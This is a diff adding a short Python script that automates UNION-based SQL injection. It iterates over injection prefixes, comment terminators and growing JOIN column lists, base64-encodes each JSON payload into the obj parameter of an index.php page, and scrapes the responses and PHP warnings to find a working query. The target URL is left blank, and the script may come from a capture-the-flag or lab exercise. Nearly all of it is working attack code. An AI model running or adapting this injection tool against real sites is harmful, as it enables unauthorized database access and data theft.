@@ -1,0 +1,40 @@
+import requests
+from base64 import b64encode
+import json
+import re
+import time
+
+sql = "UNION SELECT * FROM (SELECT 1)a "
+
+l1 = [2,3,4,5,6,7,8,9,10,11,12,13,14,15]
+l2 = ["b","c","e","f","g","h","i","j","k","l","m","n","o","p"]
+l3 = ["\'","1","1 AND 1=2","1 AND 1=1"]
+l4 = [";-- ","#","-- ",]
+
+port=""
+myurl=""
+
+for j in range (0,3):
+    sqlbase=str(l3[j])
+    #print(sqlbase)
+    for h in range (0,3):
+        sqlend=str(l4[h])
+        #print(sqlend)
+        sql1=sql
+        for i in range (0,12):
+            sql1=sql1+"JOIN (SELECT "+str(l1[i]) +")"+str(l2[i] + " ")
+            payload = json.dumps({'ID': sqlbase+" "+sql1+sqlend})
+            #print(payload)
+            payloadb64=b64encode(payload.encode('utf-8')).decode('utf-8')
+            #print(payloadb64)
+            url = str(myurl)+str(port)+'/index.php?obj=' + payloadb64
+            #print(url)
+            r = requests.get(url)
+            response=re.findall('verdana\'>(.*)</h4>',r.text)
+            response2=re.findall("<b>Warning</b>:(.*)<b>",r.text)
+            print("SQL base: "+sqlbase)
+            print("Query: "+sql1)
+            print("End of the query: "+str(sqlend))
+            print("Response:"+str(response))
+            print("Warning: "+str(response2))
+            time.sleep(2)
